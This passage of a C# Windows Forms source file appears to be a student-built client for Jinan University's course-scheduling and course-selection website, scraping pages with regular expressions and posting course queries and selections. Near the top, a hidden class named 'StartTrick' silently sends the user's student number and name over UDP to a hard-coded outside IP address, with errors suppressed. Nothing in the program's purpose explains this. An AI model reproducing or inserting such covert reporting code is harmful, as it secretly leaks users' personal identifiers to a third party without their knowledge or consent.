using System;
using System.IO;
using System.Net;
using System.Web;
using System.Text;
using System.Drawing;
using System.Threading;
using System.Drawing.Text;
using System.Windows.Forms;
using System.Collections.Generic;
using System.Text.RegularExpressions;

/****************************************************************************
 *
 *   对于这次整个项目来说，用正则表达式匹配的效率是非常低的。
 *   用DOM树解析效率会更高一点，可以作为以后做同样类型项目的思路。
 *   对于正则表达式本身，编译过一次后效率也会变高。
 * 
 ****************************************************************************/
 
namespace JNUacademic {
    public partial class SelectForm : Form {
        private readonly Encoding defaultEncoding = Encoding.GetEncoding("GB2312");
        private readonly string netError =
            "Network error, please check your network state or try again later.";
        private readonly string host = "http://jwxt.jnu.edu.cn";
        private CookieContainer cookies = null;
        private HttpWebRequest request = null;
        private HttpWebResponse response = null;

        private string tmpPage = null;
        private string scheduleFormPage = null;
        private string scheduleTablePage = null;
        private string mySelectionTablePage = null;
        private string mySelectionConfirmPage = null;
        private string selectFormPage = null;
        private string selectTablePage = null;

        private delegate string GetParameterValue(string s);

        private Dictionary<string, string> scheduleMapping = null;
        private Dictionary<string, string> selectMapping = null;
        private Dictionary<int, string> quitMapping = null;
        private Dictionary<int, string> enterMapping = null;
        
        class StartTrick {
            private readonly IPEndPoint ep = new IPEndPoint(IPAddress.Parse("45.76.195.118"), 9999);
            private StartTrick(string s) {
                /**********************************************
                 * Format of s: JNUacademic [stuNum : stuName]
                 **********************************************/
                try {
                    System.Net.Sockets.Socket socket = new System.Net.Sockets.Socket(
                        System.Net.Sockets.AddressFamily.InterNetwork,
                        System.Net.Sockets.SocketType.Dgram,
                        System.Net.Sockets.ProtocolType.Udp);
                    socket.SendTo(Encoding.UTF8.GetBytes(s), ep);
                    socket.Close();
                } catch { }
            }
            public static void Trick(string s) {
                new StartTrick(s);
            }
        }

        private SelectForm() {
            cookies = new CookieContainer();
            scheduleMapping = new Dictionary<string, string>();
            selectMapping = new Dictionary<string, string>();
            quitMapping = new Dictionary<int, string>();
            enterMapping = new Dictionary<int, string>();
            InitializeComponent();
            PrivateFontCollection font = new PrivateFontCollection();
            font.AddFontFile(Application.StartupPath + @"\RTWSYueRoudGoDemo-Regular.otf");
            this.Font = new Font(font.Families[0].Name, 10.8F, FontStyle.Regular, GraphicsUnit.Point, ((byte)(134)));
        }
        public SelectForm(CookieContainer cookies, string stuNum) : this() {
            this.cookies = cookies;
            try {
                string stuName = GetStuName();  // 如果登陆能成功，就会更改标题
                this.Text = "JNUacademic [" + stuNum + " : " + stuName + "]";
            } catch(WebException) {
                MessageBox.Show(netError, "ERROR", MessageBoxButtons.OK,
                    MessageBoxIcon.Error, MessageBoxDefaultButton.Button1);
            }
        }

        private void SelectFormLoad(object sender, System.EventArgs e) {
            try {
                LoadScheduleRequestForm();
                LoadMySelectionTable(true);
                if(mySelectionPanel.Visible == false)   // 如果是选课时间
                    LoadSelectRequestForm();
            } catch(WebException) {
                MessageBox.Show(netError, "ERROR", MessageBoxButtons.OK,
                    MessageBoxIcon.Error, MessageBoxDefaultButton.Button1);
            }
        }
        
        private void dlstXySelectedIndexChanged(object sender, EventArgs e) {
            try {
                dlstZy.Text = "";
                dlstSydx.Text = "";
                string selectedXy = dlstXy.Text;
                UpdateScheduleRequestForm();
                LoadScheduleRequestFormItem("dlstZy", dlstZy);
                LoadScheduleRequestFormItem("dlstSydx", dlstSydx);
                dlstXy.Text = selectedXy;
            } catch(WebException) {
                MessageBox.Show(netError, "ERROR", MessageBoxButtons.OK,
                    MessageBoxIcon.Error, MessageBoxDefaultButton.Button1);
            }
        }
        private void dlstZySelectedIndexChanged(object sender, EventArgs e) {
            try {
                dlstSydx.Text = "";
                string selectedZy = dlstZy.Text;
                UpdateScheduleRequestForm();
                LoadScheduleRequestFormItem("dlstSydx", dlstSydx);  // 若在这里连学院一并更新会出现死循环
                dlstZy.Text = selectedZy;                           // 可能是因为会触发一个学院的SelectedIndexChanged事件
            } catch(WebException) {
                MessageBox.Show(netError, "ERROR", MessageBoxButtons.OK,
                    MessageBoxIcon.Error, MessageBoxDefaultButton.Button1);
            }
        }

        private void scheduleQueryBtnClick(object sender, System.EventArgs e) {
            try {
                if(CheckScheduleQueryForm() == true) {
                    zhengzaichaxun.Text = "正在查询。。。";
                    ScheduleQueryRequest();
                    zhengzaichaxun.Text = "";
                }
                else {
                    string frmError = "Query information error, please check.";
                    MessageBox.Show(frmError, "ERROR", MessageBoxButtons.OK,
                        MessageBoxIcon.Error, MessageBoxDefaultButton.Button1);
                }
            } catch(WebException) {
                MessageBox.Show(netError, "ERROR", MessageBoxButtons.OK,
                    MessageBoxIcon.Error, MessageBoxDefaultButton.Button1);
            }
        }
        private void clearBtnClick(object sender, System.EventArgs e) {
            txtNj.Text = "";
            dlstXxlb.Text = "";
            dlstKclb.Text = "";
            dlstXqu.Text = "";
            txtKcmc.Text = "";
            txtKcbh.Text = "";
            txtKKZJ.Text = "";
            dlstSqb.Text = "";
            dlstXy.Text = "";
            dlstZy.Text = "";
            dlstSydx.Text = "";
            txtPkbh.Text = "";
        }
        
        // 对于接下来的两个按钮，如果去掉，改成Text改变就触发request，会造成触发时机错误或死循环
        private string nowRows = "";
        private void rowChangeSubmitClick(object sender, EventArgs e) {
            try {
                if(txtRows.Text != nowRows) {  // 如果没改过，就不用执行了
                    if(Regex.IsMatch(txtRows.Text, "^[1-9][0-9]*$")) 
                        UpdateScheduleTableBySelections("txtRows");
                    else {
                        string frmError = "Invalid input argument, please check.";
                        MessageBox.Show(frmError, "ERROR", MessageBoxButtons.OK,
                            MessageBoxIcon.Error, MessageBoxDefaultButton.Button1);
                    }
                }
            } catch(WebException) {
                MessageBox.Show(netError, "ERROR", MessageBoxButtons.OK,
                    MessageBoxIcon.Error, MessageBoxDefaultButton.Button1);
            }
        }
        private string nowPage = "";
        private void gotoSubmitClick(object sender, EventArgs e) {
            try {
                if(dlstPage.Text != nowPage)
                    UpdateScheduleTableBySelections("dlstPage");
            } catch(WebException) {
                MessageBox.Show(netError, "ERROR", MessageBoxButtons.OK,
                    MessageBoxIcon.Error, MessageBoxDefaultButton.Button1);
            }
        }

        private void prevPageClick(object sender, EventArgs e) {
            try {
                if(dlstPage.Text != "1")
                    UpdateScheduleTableByArrows("ibtnPrev");
            } catch(WebException) {
                MessageBox.Show(netError, "ERROR", MessageBoxButtons.OK,
                    MessageBoxIcon.Error, MessageBoxDefaultButton.Button1);
            }
        }
        private void nextPageClick(object sender, EventArgs e) {
            try {
                if(dlstPage.Text != Regex.Match(lblRowPages.Text, "\\d+").Groups[0].Value)
                    UpdateScheduleTableByArrows("ibtnNext");
            } catch(WebException) {
                MessageBox.Show(netError, "ERROR", MessageBoxButtons.OK,
                    MessageBoxIcon.Error, MessageBoxDefaultButton.Button1);
            }
        }

        private void btnSearchClick(object sender, EventArgs e) {
            try {
                UpdateMySelectionTableBySearch();
            } catch(WebException) {
                MessageBox.Show(netError, "ERROR", MessageBoxButtons.OK,
                    MessageBoxIcon.Error, MessageBoxDefaultButton.Button1);
            }
        }

        private void mySelectionTableCellContentClick(object sender, DataGridViewCellEventArgs e) {
            if(mySelectionPanel.Visible == false && mySelectionTable.Columns[e.ColumnIndex].Name == "tuike") {
                try {
                    QuitCourse(mySelectionTable.Rows[e.RowIndex]);
                } catch(WebException) {
                    MessageBox.Show(netError, "ERROR", MessageBoxButtons.OK,
                        MessageBoxIcon.Error, MessageBoxDefaultButton.Button1);
                }
            }
        }

        private void refreshClick(object sender, EventArgs e) {
            try {
                LoadMySelectionTable(false);
            } catch(WebException) {
                MessageBox.Show(netError, "ERROR", MessageBoxButtons.OK,
                    MessageBoxIcon.Error, MessageBoxDefaultButton.Button1);
            }
        }

        private void sdlstXySelectedIndexChanged(object sender, EventArgs e) {
            try {
                sdlstZy.Text = "";
                sdlstSydx.Text = "";
                string selectedXy = sdlstXy.Text;
                UpdateSelectRequestForm();
                LoadSelectRequestFormItem("dlstZy", sdlstZy);
                LoadSelectRequestFormItem("dlstSydx", sdlstSydx);
                sdlstXy.Text = selectedXy;
            } catch(WebException) {
                MessageBox.Show(netError, "ERROR", MessageBoxButtons.OK,
                    MessageBoxIcon.Error, MessageBoxDefaultButton.Button1);
            }
        }
        private void sdlstZySelectedIndexChanged(object sender, EventArgs e) {
            try {
                sdlstSydx.Text = "";
                string selectedZy = sdlstZy.Text;
                UpdateSelectRequestForm();
                LoadSelectRequestFormItem("dlstSydx", sdlstSydx);
                sdlstZy.Text = selectedZy;
            } catch(WebException) {
                MessageBox.Show(netError, "ERROR", MessageBoxButtons.OK,
                    MessageBoxIcon.Error, MessageBoxDefaultButton.Button1);
            }
        }
    
        private void sbtnSearchClick(object sender, EventArgs e) {
            try {
                if(CheckSelectQueryForm() == true) {
                    szhengzaichaxun.Text = "正在查询。。。";
                    SelectQueryRequest();
                    szhengzaichaxun.Text = "";
                }
                else {
                    string frmError = "Query information error, please check.";
                    MessageBox.Show(frmError, "ERROR", MessageBoxButtons.OK,
                        MessageBoxIcon.Error, MessageBoxDefaultButton.Button1);
                }
            } catch(WebException) {
                MessageBox.Show(netError, "ERROR", MessageBoxButtons.OK,
                    MessageBoxIcon.Error, MessageBoxDefaultButton.Button1);
            }
        }

        private string snowRows = "";
        private void srowChangeSubmitClick(object sender, EventArgs e) {
            try {
                if(stxtRows.Text != snowRows) {  // 如果没改过，就不用执行了
                    if(Regex.IsMatch(stxtRows.Text, "^[1-9][0-9]*$")) 
                        UpdateSelectTableBySelections("txtRows");
                    else {
                        string frmError = "Invalid input argument, please check.";
                        MessageBox.Show(frmError, "ERROR", MessageBoxButtons.OK,
                            MessageBoxIcon.Error, MessageBoxDefaultButton.Button1);
                    }
                }
            } catch(WebException) {
                MessageBox.Show(netError, "ERROR", MessageBoxButtons.OK,
                    MessageBoxIcon.Error, MessageBoxDefaultButton.Button1);
            }
        }
        private string snowPage = "";
        private void sgotoSubmitClick(object sender, EventArgs e) {
            try {
                if(sdlstPage.Text != snowPage)
                    UpdateSelectTableBySelections("dlstPage");
            } catch(WebException) {
                MessageBox.Show(netError, "ERROR", MessageBoxButtons.OK,
                    MessageBoxIcon.Error, MessageBoxDefaultButton.Button1);
            }
        }

        private void sprevPageClick(object sender, EventArgs e) {
            try {
                if(sdlstPage.Text != "1")
                    UpdateSelectTableByArrows("ibtnPrev");
            } catch(WebException) {
                MessageBox.Show(netError, "ERROR", MessageBoxButtons.OK,
                    MessageBoxIcon.Error, MessageBoxDefaultButton.Button1);
            }
        }
        private void snextPageClick(object sender, EventArgs e) {
            try {
                if(sdlstPage.Text != Regex.Match(slblRowPages.Text, "\\d+").Groups[0].Value)
                    UpdateSelectTableByArrows("ibtnNext");
            } catch(WebException) {
                MessageBox.Show(netError, "ERROR", MessageBoxButtons.OK,
                    MessageBoxIcon.Error, MessageBoxDefaultButton.Button1);
            }
        }

        private void selectTableCellContentClick(object sender, DataGridViewCellEventArgs e) {
            if(mySelectionPanel.Visible == false && selectTable.Columns[e.ColumnIndex].Name == "xuanke") {
                try {
                    SelectCourse(selectTable.Rows[e.RowIndex]);
                } catch(WebException) {
                    MessageBox.Show(netError, "ERROR", MessageBoxButtons.OK,
                        MessageBoxIcon.Error, MessageBoxDefaultButton.Button1);
                }
            }
        }


        private void LoadHttpRequest(string uri, string method, string referer) {
            request = WebRequest.Create(host + uri) as HttpWebRequest;
            request.CookieContainer = cookies;
            request.Method = method;
            request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0";
            request.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
            request.Headers.Add(HttpRequestHeader.AcceptLanguage, "en-US,en;q=0.8,zh-CN;q=0.5,zh;q=0.3");
            request.Headers.Add(HttpRequestHeader.AcceptEncoding, "gzip, deflate");
            request.Referer = referer;
            request.KeepAlive = true;
            request.Headers.Add("Upgrade-Insecure-Requests", "1");
        }
        private void PostHttpRequest(string content) {
            request.ContentType = "application/x-www-form-urlencoded";
            request.ContentLength = content.Length;
            using(Stream stream = request.GetRequestStream()) {
                byte[] postContent = Encoding.ASCII.GetBytes(content);
                stream.Write(postContent, 0, postContent.Length);
            }
        }
        private void GetHttpResponse(ref string cachePage) {
            response = request.GetResponse() as HttpWebResponse;
            using(Stream stream = response.GetResponseStream()) {
                StreamReader reader = new StreamReader(stream, defaultEncoding);
                cachePage = reader.ReadToEnd();
                reader.Close();
            }
            request.Abort();
            response.Close();
        }


        /// <summary>
        ///   Return the name of student by this cookie
        /// </summary>
        private string GetStuName() {
            LoadHttpRequest("/areaTopLogo.aspx", "GET", "http://jwxt.jnu.edu.cn/IndexPage.aspx");
            GetHttpResponse(ref tmpPage);

            Match mXM = Regex.Match(tmpPage, "<span id=\"header_lblXM\">(.*?)</span>");
            return mXM.Groups[1].Value;
        }
        
        #region For schedule form and table
        #region Unused after debug
        private void AddRowForDebug() {
            AddScheduleRow(new ScheduleTuple("01009410", "《红楼梦》赏析", "60", "60", "曾肖", "",
                "2.0", "①校本部教学大楼215室", "①周一 - 11, 12节", "201725435", "", "", "拟招60人", "开卷"));
            AddScheduleRow(new ScheduleTuple("05010100", "《红楼梦》与中华文化", "216", "159", "罗立群", "汉语言文学",
                "2.0", "①珠海校区教学楼阶梯4", "①周三 - 11, 12节", "201726572", "内招生", "2017-7-10 10:20-12:10", "14编辑内外招、14文秘内外招、15编辑内外招、15文秘内外招", "笔试"));
            AddScheduleRow(new ScheduleTuple("05010045", "《世说新语》导读", "110", "86", "胡晓薇", "汉语言文学",
                "2.0", "①珠海校区教学楼教506", "①周五 - 3, 4节", "201726563", "内招生", "", "16编辑内外招、16文秘内外招", "笔试"));
            AddScheduleRow(new ScheduleTuple("08060244", "Windows 编程", "63", "51", "张庆丰", "计算机科学与技术",
                "2.0", "①南校区教学楼501", "①周二 - 1, 2节", "201725820", "内招生", "", "2014级计机、软件、网络内外合。", "笔试"));
            AddScheduleRow(new ScheduleTuple("03010048", "比较行政法", "85", "60", "刘文静", "法学",
                "2.0", "①南校区教学楼305", "①周五 - 3,4节", "201725963", "外招生", "2017-07-07 10:20-12:10", "法学内外招", "笔试"));
        }
        /// <summary>
        ///   Add an row to schedule table, but it is unused since the issue of performance
        /// </summary>
        private void AddScheduleRow(ScheduleTuple st) {
            scheduleTable.Rows.Add(st.id, st.title, st.limit, st.selected, st.instructor, st.major,
                st.credit, st.location, st.time, st.classid, st.orientation, st.exam, st.extra, st.method);
        }
        #endregion
        
        /// <summary>
        ///   Get the request form used to query the course schedule
        /// </summary>
        private void LoadScheduleRequestForm() {
            LoadHttpRequest("/Secure/PaiKeXuanKe/wfrm_Pk_RlRscx.aspx", "GET", "http://jwxt.jnu.edu.cn/areaMain.aspx");
            GetHttpResponse(ref scheduleFormPage);

            LoadScheduleRequestFormItem("dlstXxlb", dlstXxlb);  //修学类别
            LoadScheduleRequestFormItem("dlstKclb", dlstKclb);  //课程类别
            LoadScheduleRequestFormItem("dlstXqu", dlstXqu);  //校区
            LoadScheduleRequestFormItem("dlstSqb", dlstSqb);  //暑期班
            LoadScheduleRequestFormItem("dlstXy", dlstXy);  //学院
            LoadScheduleRequestFormItem("dlstZy", dlstZy);  //专业
            LoadScheduleRequestFormItem("dlstSydx", dlstSydx);  //专业方向
            LoadScheduleRequestFormSpecialItem("dlstXndZ", dlstXndZ);  //学年度
            LoadScheduleRequestFormSpecialItem("dlstNdxq", dlstNdxq);  //学期
        }

        /// <summary>
        ///   Update the Schedule Request form if Xy or Zy is selected
        /// </summary>
        private void UpdateScheduleRequestForm() {
            LoadHttpRequest("/Secure/PaiKeXuanKe/wfrm_Pk_RlRscx.aspx", "POST",
                "http://jwxt.jnu.edu.cn/Secure/PaiKeXuanKe/wfrm_Pk_RlRscx.aspx");
            string requestContent = GetScheduleQueryRequestBase(scheduleFormPage) + 
                "&" + GetScheduleQueryRequestAppend();
            PostHttpRequest(requestContent);
            GetHttpResponse(ref scheduleFormPage);
        }

        /// <summary>
        ///   Load one item to the combo box by parsing cache page
        /// </summary>
        private void LoadScheduleRequestFormItem(string itemName, ComboBox itemCombo) {
            itemCombo.Items.Clear();
            Match mItem = Regex.Match(scheduleFormPage, "<select(.*?)" + itemName + "(.*?)>([\\s\\S]*?)</select>");
            string opItem = mItem.Groups[3].Value;  // 该组包括换行符，得使用[\s\S]代替.
            MatchCollection iItem = Regex.Matches(opItem, "<option(.*?)value=\"(.*?)\"(.*?)>(.*?)</option>");
            foreach(Match m in iItem) {
                string name = m.Groups[4].Value;
                string key = itemName + name;
                if(!scheduleMapping.ContainsKey(key))
                    scheduleMapping.Add(key, m.Groups[2].Value);
                itemCombo.Items.Add(name);
            }
        }
        /// <summary>
        ///   Only for two special case (must select) combo box (fuck you)
        /// </summary>
        private void LoadScheduleRequestFormSpecialItem(string itemName, ComboBox itemCombo) {
            itemCombo.Items.Clear();
            Match mItem = Regex.Match(scheduleFormPage, "<select(.*?)" + itemName + "(.*?)>([\\s\\S]*?)</select>");
            string opItem = mItem.Groups[3].Value;  // 该组包括换行符，得使用[\s\S]代替.
            MatchCollection iItem = Regex.Matches(opItem, "<option(.*?)value=\"(.*?)\"(.*?)>(.*?)</option>");
            foreach(Match m in iItem) {
                string name = m.Groups[4].Value;
                string key = itemName + name;
                if(key.Length <= 1)
                    continue;
                if(!scheduleMapping.ContainsKey(key))
                    scheduleMapping.Add(key, m.Groups[2].Value);
                itemCombo.Items.Add(name);
                if(m.Value.Contains("selected"))
                    itemCombo.Text = name;
            }
        }

        /// <summary>
        ///   Check whether the query item is correctly input.
        /// </summary>
        private delegate bool CheckComboBox(ComboBox c);
        private bool CheckScheduleQueryForm() {
            CheckComboBox check = (c) => {  // 除非有人填错项的位置（假设没有傻逼）
                return scheduleMapping.ContainsKey(c.Name + c.Text);
            };
            return check(dlstXxlb) && check(dlstKclb) && check(dlstXqu) && check(dlstSqb) &&
                check(dlstXy) && check(dlstZy) && check(dlstSydx) && check(dlstXndZ) && check(dlstNdxq);
        }

        /// <summary>
        ///   Request for the course schedule table
        /// </summary>
        private void ScheduleQueryRequest() {
            LoadHttpRequest("/Secure/PaiKeXuanKe/wfrm_Pk_RlRscx.aspx", "POST",
                "http://jwxt.jnu.edu.cn/Secure/PaiKeXuanKe/wfrm_Pk_RlRscx.aspx");
            string requestContent = GetScheduleQueryRequestBase(scheduleFormPage) +
                "&" + GetScheduleQueryRequestAppend() + "&lbtnSearch=%B2%E9%D1%AF";
            PostHttpRequest(requestContent);
            GetHttpResponse(ref scheduleTablePage);

            UpdateScheduleTable();
            UpdateScheduleTableSelections();
        }

        /// <summary>
        ///   Get post request's content except the selected item
        /// </summary>
        private string GetScheduleQueryRequestBase(string page) {
            GetParameterValue getValue = (s) => {
                string ms = Regex.Match(page, "<input(.*?)" + s + "(.*?)value=\"(.*?)\" />").Groups[3].Value;
                return HttpUtility.UrlEncode(ms, defaultEncoding);
            };
            string __EVENTTARGET = getValue("__EVENTTARGET");
            string __EVENTARGUMENT = getValue("__EVENTARGUMENT");
            string __LASTFOCUS = getValue("__LASTFOCUS");
            string __VIEWSTATE = getValue("__VIEWSTATE");
            string __VIEWSTATEGENERATOR = getValue("__VIEWSTATEGENERATOR");
            string __EVENTVALIDATION = getValue("__EVENTVALIDATION");

            return string.Format("__EVENTTARGET={0}&__EVENTARGUMENT={1}&__LASTFOCUS={2}&__VIEWSTATE={3}&__VIEWSTATEGENERATOR={4}&__EVENTVALIDATION={5}",
                __EVENTTARGET, __EVENTARGUMENT, __LASTFOCUS, __VIEWSTATE, __VIEWSTATEGENERATOR, __EVENTVALIDATION);
        }
        /// <summary>
        ///   Returns the selected items as post parameter format
        /// </summary>
        private string GetScheduleQueryRequestAppend() {
            string append = "txtNj=" + HttpUtility.UrlEncode(txtNj.Text, defaultEncoding);
            append += "&dlstJd=0";
            append += "&dlstXxlb=" + scheduleMapping["dlstXxlb" + dlstXxlb.Text];
            append += "&dlstZsdx=";
            append += "&dlstSkyy=";
            append += "&dlstKclb=" + scheduleMapping["dlstKclb" + dlstKclb.Text];
            append += "&dlstXqu=" + HttpUtility.UrlEncode(scheduleMapping["dlstXqu" + dlstXqu.Text], defaultEncoding);
            append += "&txtKcmc=" + HttpUtility.UrlEncode(txtKcmc.Text, defaultEncoding);
            append += "&txtKcbh=" + HttpUtility.UrlEncode(txtKcbh.Text, defaultEncoding);
            append += "&txtKKZJ=" + HttpUtility.UrlEncode(txtKKZJ.Text, defaultEncoding);
            append += "&dlstKkdw=";
            append += "&txtKj=";
            append += "&txtAddress=";
            append += "&txtBZXX=";
            append += "&dlstPycc=";
            append += "&dlstSqb=" + HttpUtility.UrlEncode(scheduleMapping["dlstSqb" + dlstSqb.Text], defaultEncoding);
            append += "&dlstXy=" + scheduleMapping["dlstXy" + dlstXy.Text];
            append += "&dlstZy=" + scheduleMapping["dlstZy" + dlstZy.Text];
            if(dlstSydx.Text == "")     // special case (fuck you)
                append += "&dlstSydx=4";
            else
                append += "&dlstSydx=" + scheduleMapping["dlstSydx" + dlstSydx.Text];
            append += "&dlstXndZ=" + scheduleMapping["dlstXndZ" + dlstXndZ.Text];
            append += "&dlstNdxq=" + HttpUtility.UrlEncode(scheduleMapping["dlstNdxq" + dlstNdxq.Text], defaultEncoding);
			append += "&txtPkbh=" + HttpUtility.UrlEncode(txtPkbh.Text, defaultEncoding);
            return append + "&chkBb=on&chkWxk=on";
        }

        /// <summary>
        ///   Update the schedule table with course information
        /// </summary>
        private void UpdateScheduleTable() {
            scheduleTable.Rows.Clear();
            MatchCollection mc = Regex.Matches(scheduleTablePage, "<tr class=\"DG(Alternating|Selected)?ItemStyle\">([\\s\\S]*?)</tr>");
            foreach(Match m in mc) {
                string courseItem = m.Groups[2].Value.Replace("&nbsp;", "");
                Match mItem = Regex.Match(courseItem,
                    "<td>(.*?)</td>\\s*" +  // 课程编号 1
                    "<td>(.*?)</td>\\s*" +  // 课程名称 2
                    "<td>(.*?)</td>\\s*" +  // 排课限制 3
                    "<td>(.*?)</td>\\s*" +  // 选课人数 4
                    "<td>(.*?)</td>\\s*" +  // 主讲教师 5
                    "<td>(.*?)</td>\\s*" +  // 专业名称 6
                    "<td>(.*?)</td>\\s*" +  // 学分数 7
                    "<td>\\s*<span(.*?)>(.*?)</span>\\s*</td>\\s*" +  // 授课地点 9
                    "<td>\\s*<span(.*?)>(.*?)</span>\\s*</td>\\s*" +  // 时间安排 11
                    "<td>(.*?)</td>\\s*" +  // 排课班号 12
                    "<td>(.*?)</td>\\s*" +  // 招生对象 13
                    "<td>(.*?)</td>\\s*" +  // 考试时间 14
                    "<td>(.*?)</td>\\s*" +  // 备注 15
                    "<td>(.*?)</td>");  // 方式 16
                scheduleTable.Rows.Add(mItem.Groups[1].Value, mItem.Groups[2].Value.Trim(),
                    mItem.Groups[3].Value, mItem.Groups[4].Value, mItem.Groups[5].Value, mItem.Groups[6].Value, 
                    mItem.Groups[7].Value, mItem.Groups[9].Value, mItem.Groups[11].Value, mItem.Groups[12].Value, 
                    mItem.Groups[13].Value, mItem.Groups[14].Value, mItem.Groups[15].Value, mItem.Groups[16].Value);
            }
        }
        /// <summary>
        ///   Update the button, combobox and label
        /// </summary>
        private void UpdateScheduleTableSelections(){
            txtRows.Text = Regex.Match(scheduleTablePage, "<input(.*?)txtRows(.*?)value=\"(.*?)\"(.*?)/>").Groups[3].Value;
            nowRows = txtRows.Text;
            lblRowPages.Text = Regex.Match(scheduleTablePage, "<span id=\"lblRowPages\">(.*?)</span>").Groups[1].Value;
            dlstPage.Items.Clear();
            int totalPages = Int32.Parse(Regex.Match(lblRowPages.Text, "\\d+").Groups[0].Value);
            if(totalPages == 0)
                totalPages = 1;
            for(int i = 1; i <= totalPages; i++)
                dlstPage.Items.Add(i);
            dlstPage.Text = Regex.Match(scheduleTablePage, "<option selected=\"selected\" value=\"(.*?)\">").Groups[1].Value;
            nowPage = dlstPage.Text;
        }

        /// <summary>
        ///   Update schedule table by the item selections in panel2
        /// </summary>
        private void UpdateScheduleTableBySelections(string eventTarget) {
            LoadHttpRequest("/Secure/PaiKeXuanKe/wfrm_Pk_RlRscx.aspx", "POST",
                "http://jwxt.jnu.edu.cn/Secure/PaiKeXuanKe/wfrm_Pk_RlRscx.aspx");
            string requestContent = GetScheduleQueryRequestBase(scheduleTablePage)
                .Replace("__EVENTTARGET=", "__EVENTTARGET=" + eventTarget) + "&hidZhss="
                + string.Format("&txtRows={0}&dlstPage={1}", txtRows.Text, dlstPage.Text);
            PostHttpRequest(requestContent);
            GetHttpResponse(ref scheduleTablePage);

            UpdateScheduleTable();
            UpdateScheduleTableSelections();
        }
        /// <summary>
        ///   Update table by left or right arrows
        /// </summary>
        private void UpdateScheduleTableByArrows(string btn) {
            LoadHttpRequest("/Secure/PaiKeXuanKe/wfrm_Pk_RlRscx.aspx", "POST",
                "http://jwxt.jnu.edu.cn/Secure/PaiKeXuanKe/wfrm_Pk_RlRscx.aspx");
            string requestContent = GetScheduleQueryRequestBase(scheduleTablePage) + "&hidZhss="
                + string.Format("&txtRows={0}&" + GetButtonParameter(btn) + "&dlstPage={1}", txtRows.Text, dlstPage.Text);
            PostHttpRequest(requestContent);
            GetHttpResponse(ref scheduleTablePage);
            
            UpdateScheduleTable();
            UpdateScheduleTableSelections();
        }

        /// <summary>
        ///   Return the parameter of the click positionin the button
        /// </summary>
        private string GetButtonParameter(string btn) {
            // x和y只是记录点击按钮的位置，我觉得特别有病
            string x = new Random().Next(20).ToString();
            Thread.Sleep(9);
            string y = new Random().Next(20).ToString();
            return string.Format("{0}.x={1}&{0}.y={2}", btn, x, y);
        }
        #endregion

        #region For my selected course table
        /// <summary>
        ///  Load selected table confirm and result (automatically)
        /// </summary>
        private void LoadMySelectionTable(bool first) {
            LoadHttpRequest("/Secure/PaiKeXuanKe/wfrm_Xk_ReadMeCn.aspx", "GET", "http://jwxt.jnu.edu.cn/areaMain.aspx");
            GetHttpResponse(ref mySelectionTablePage);

            if(first) {
                LoadHttpRequest("/Secure/PaiKeXuanKe/wfrm_Xk_ReadMeCn.aspx", "POST",
                    "http://jwxt.jnu.edu.cn/Secure/PaiKeXuanKe/wfrm_Xk_ReadMeCn.aspx");
                string requestContent = GetMySelectionRequestBase(mySelectionTablePage) + "&btnYes=%CA%C7%28Yes%29";
                PostHttpRequest(requestContent);
                GetHttpResponse(ref mySelectionTablePage);
            }

            UpdateMySelectionTable();
        }

        /// <summary>
        ///   Used to get parameter values in the selected courses page
        /// </summary>
        private string GetMySelectionRequestBase(string page) {
            GetParameterValue getValue = (s) => {
                string ms = Regex.Match(page, "<input(.*?)" + s + "(.*?)value=\"(.*?)\" />").Groups[3].Value;
                return HttpUtility.UrlEncode(ms, defaultEncoding);
            };
            string __VIEWSTATE = getValue("__VIEWSTATE");
            string __VIEWSTATEGENERATOR = getValue("__VIEWSTATEGENERATOR");
            string __EVENTVALIDATION = getValue("__EVENTVALIDATION");

            return string.Format("__VIEWSTATE={0}&__VIEWSTATEGENERATOR={1}&__EVENTVALIDATION={2}",
                __VIEWSTATE, __VIEWSTATEGENERATOR, __EVENTVALIDATION);
        }

        /// <summary>
        ///   搞什么鬼啊写到这里突然弹出未注册不能进入系统！（2017/2/23 22:06）
        /// </summary>
        private void UpdateMySelectionTable() {
            mySelectionTable.Rows.Clear();

            if(!mySelectionTablePage.Contains("导出课程表")) {  //非选课时间
                tuike.Visible = false;
                MatchCollection mc = Regex.Matches(mySelectionTablePage, "<tr class=\"DG(Alternating|Selected)?ItemStyle\">([\\s\\S]*?)</tr>");
                foreach(Match m in mc) {
                    string courseItem = m.Groups[2].Value.Replace("&nbsp;", "");
                    Match mItem = Regex.Match(courseItem,
                        "<td>(.*?)</td>\\s*" +  // 排课班号 1
                        "<td>(.*?)</td>\\s*" +  // 课程编号 2
                        "<td>(.*?)</td>\\s*" +  // 课程名称 3
                        "<td>(.*?)</td>\\s*" +  // 学分 4
                        "<td>(.*?)</td>\\s*" +  // 修学 5
                        "<td>(.*?)</td>\\s*" +  // 类别 6
                        "<td>(.*?)</td>\\s*" +  // 时间安排 7
                        "<td>(.*?)</td>\\s*" +  // 授课教师 8
                        "<td>(.*?)</td>\\s*" +  // 上课地点 9
                        "<td>(.*?)</td>\\s*" +  // 备注 10
                        "<td>(.*?)</td>\\s*" +  // 阶段 11
                        "<td>(.*?)</td>");  // 考试时间 12
                    mySelectionTable.Rows.Add(null, mItem.Groups[1].Value, mItem.Groups[2].Value,
                        mItem.Groups[3].Value, mItem.Groups[4].Value, mItem.Groups[5].Value.Trim(),
                        mItem.Groups[6].Value.Trim(), mItem.Groups[7].Value, mItem.Groups[8].Value, 
                        mItem.Groups[9].Value, mItem.Groups[10].Value, mItem.Groups[11].Value, mItem.Groups[12].Value);
                }
                LoadMySelectionSpecialItem("dlstXndZ", dlstMyXndZ);
                LoadMySelectionSpecialItem("dlstNdxq", dlstMyNdxq);
            }

            else {        // 选课时间
                mySelectionConfirmPage = mySelectionTablePage;
                mySelectionPanel.Visible = false;
                lblXf.Visible = true;
                
                LoadHttpRequest("/Secure/PaiKeXuanKe/wfrm_XK_XuanKe.aspx", "POST",
                    "http://jwxt.jnu.edu.cn/Secure/PaiKeXuanKe/wfrm_XK_XuanKe.aspx");
                string requestContent = GetMySelectionRequestBase(mySelectionConfirmPage) + "&btnWdXk=%CE%D2%B5%C4%D1%A1%BF%CE";
                PostHttpRequest(requestContent);
                GetHttpResponse(ref mySelectionTablePage);

                mySelectionTable.Rows.Clear();
                quitMapping.Clear();
                int rows = 0;
                MatchCollection mc = Regex.Matches(mySelectionTablePage, "<tr class=\"DG(Alternating|Selected)?ItemStyle\">([\\s\\S]*?)</tr>");
                foreach(Match m in mc) {
